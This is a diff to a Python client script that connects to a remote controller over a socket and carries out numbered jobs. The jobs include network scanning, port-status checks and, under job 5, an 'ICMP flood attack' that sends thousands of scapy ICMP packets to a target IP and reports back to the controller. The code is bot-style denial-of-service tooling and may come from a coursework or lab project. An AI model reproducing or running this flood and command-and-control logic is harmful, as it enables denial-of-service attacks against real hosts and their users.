@@ -51,7 +51,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
                     print("{:16}    {}".format(ip['ip'], ip['mac']))    
                
                 client.sendall(str.encode(command))
-                client.sendall(str(ips.append(3)).encode())
+                client.sendall(str(ips).encode())
+
             elif JOB[0] == "2":
                 print("Client: Client #" + str(CLIENT_NUM) + " the current job is: ",
                     "Detect the status of a given port at a given IP address")
@@ -98,15 +99,18 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
                 client.sendall(str([target_ip, target_port, loop, 4]).encode())
             
             elif JOB[0] == "5":
+                print("Client: Client #" + str(CLIENT_NUM) + " the current job is: ",
+                    "Perform ICMP flood attack at a given IP address of a given port")
                 remain = JOB[2:].split()
                 target_ip = remain[0]
                 target_port = remain[1]
+                print(target_ip, target_port)
                 loop = 2500 + 1
                 for x in range(0, loop):
                     send(IP(dst=target_ip)/ICMP(), verbose=0)
                     print(".", end="", flush=True)
                 client.sendall(str.encode(command))
-                client.sendall(str([target_ip, target_port, loop, 4]).encode())
+                client.sendall(str([target_ip, target_port, loop, 5]).encode())
             else:
                 print("NO JOB TAKEN")
             continue
